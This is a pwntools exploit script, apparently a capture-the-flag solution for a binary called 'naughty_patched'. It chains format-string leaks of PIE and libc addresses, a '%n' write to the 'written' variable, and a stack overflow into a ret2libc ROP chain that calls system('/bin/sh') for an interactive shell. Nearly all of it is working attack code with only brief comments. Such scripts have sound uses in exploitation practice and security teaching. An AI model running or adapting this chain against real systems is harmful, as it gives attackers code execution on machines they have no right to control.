#!/usr/bin/env python3

from pwn import *
context.terminal = ["tmux", "splitw", "-h"]
encode   = lambda e: e if type(e) == bytes else str(e).encode()
hexleak  = lambda l: int(l[:-1] if (l[-1] == b'\n' or l[-1] == b'|') else l, 16)

exe = "./naughty_patched"
elf = context.binary = ELF(exe)
libc = elf.libc
io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
if args.GDB: gdb.attach(io)

def menu(opt: int):
    io.sendlineafter(b">> ", encode(opt))

def add_user(name: str):
    menu(1)
    io.sendlineafter(b": ", encode(name))

def print_user(idx: int):
    menu(2)
    io.sendlineafter(b": ", encode(idx))
    io.recvuntil(b"Name: ")
    return io.recvuntil(b"Is ")[:-3]

def modify_user(idx: int, name: str):
    menu(3)
    io.sendlineafter(b": ", encode(idx))
    io.sendlineafter(b": ", encode(name))

# Using the first edit primitive to leak pie and libc
modify_user(0, "|%6$p|%35$p|")
leaks = print_user(0).split(b'|')[1:]
print(leaks)

elf_leak = hexleak(leaks[0])
libc_leak = hexleak(leaks[1])

elf.address = elf_leak - 0x20b5
libc.address = libc_leak - 0x29d90
info("elf @ %#x" % elf.address)
info("libc @ %#x" % libc.address)

# Overwrite data @ written to be 0 so we can perform our write
overwrite = b"%c%9$n||" + p64(elf.sym.written)
modify_user(1, overwrite)
print_user(1)

# Perform overflow and a simple ret2libc:
payload = flat(
    cyclic(88, n=8),
    libc.address + 0x000000000002a3e5, # pop rdi
    next(libc.search(b"/bin/sh\x00")),
    libc.address + 0x0000000000029139, # ret
    libc.sym.system
)
add_user(payload)

io.interactive()
